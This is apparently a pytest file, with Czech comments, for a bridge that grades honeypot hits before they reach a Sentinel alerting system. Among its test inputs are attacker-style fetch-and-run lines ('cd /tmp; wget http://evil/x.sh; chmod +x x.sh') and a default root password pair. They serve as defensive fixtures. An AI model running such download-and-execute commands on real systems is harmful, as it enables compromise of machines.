"""Bezny zasah honeypotu neni incident.

Honeypot je vystaveny prave proto, aby ho skenery trefovaly. Za jedno
dopoledne jich bylo 254 a vsechny chodily do Sentinelu jako "high", takze
prebijely skutecne problemy (treba disk s vadnymi sektory).
"""
import pytest

import bridge
import conf as _conf


def _hit(**extra):
    e = {"type": "attack", "protocol": "ssh", "dst_port": 2222,
         "src_ip": "195.184.76.212", "country": "United States", "isp": "ONYPHE SAS"}
    e.update(extra)
    return e


def test_ordinary_hit_is_low(monkeypatch):
    monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "low", raising=False)
    assert bridge._translate(_hit())["severity"] == "low"


def test_severity_is_configurable(monkeypatch):
    monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "medium", raising=False)
    assert bridge._translate(_hit())["severity"] == "medium"


@pytest.mark.parametrize("extra", [
    {"credentials": "root:123456"},
    {"commands": "wget http://evil/x.sh"},
    {"payload": "cd /tmp; wget http://evil/x.sh; chmod +x x.sh"},
    {"payload": "A" * 250},
])
def test_notable_hit_is_raised(monkeypatch, extra):
    """Az kdyz utocnik neco dokaze, je to udalost — ne pouhy sken."""
    monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "low", raising=False)
    monkeypatch.setattr(_conf, "SENTINEL_NOTABLE_SEVERITY", "medium", raising=False)
    assert bridge._translate(_hit(**extra))["severity"] == "medium"


@pytest.mark.parametrize("ip", ["10.0.0.5", "192.168.2.50", "172.16.3.9"])
def test_hit_from_own_network_is_raised(monkeypatch, ip):
    """Zasah z vlastni site neni bezny internetovy sum."""
    monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "low", raising=False)
    monkeypatch.setattr(_conf, "SENTINEL_NOTABLE_SEVERITY", "medium", raising=False)
    assert bridge._translate(_hit(src_ip=ip))["severity"] == "medium"


@pytest.mark.parametrize("ip", ["172.15.0.1", "172.32.0.1", "8.8.8.8"])
def test_public_ip_stays_low(monkeypatch, ip):
    """Okoli rozsahu 172.16-31 se nesmi chytat omylem."""
    monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "low", raising=False)
    assert bridge._translate(_hit(src_ip=ip))["severity"] == "low"


@pytest.mark.parametrize("payload", [
    "[ssh=SSH-2.0-libssh_0.9.6] SSH-2.0-libssh_0.9.6\n",
    "GET /admin HTTP/1.1",
    "HTTP/1.1",
    "",
])
def test_banner_is_not_interaction(monkeypatch, payload):
    """KAZDY zachyt ma payload — i holy banner. Jeho pritomnost nic neznamena.

    Prvni verze brala `payload` jako znamku interakce, takze by se jako
    neobvykly oznacil uplne kazdy zasah a zmena by byla k nicemu. Vzorek je
    skutecny radek z provozni databaze.
    """
    monkeypatch.setattr(_conf, "SENTINEL_HIT_SEVERITY", "low", raising=False)
    assert bridge._translate(_hit(payload=payload))["severity"] == "low"
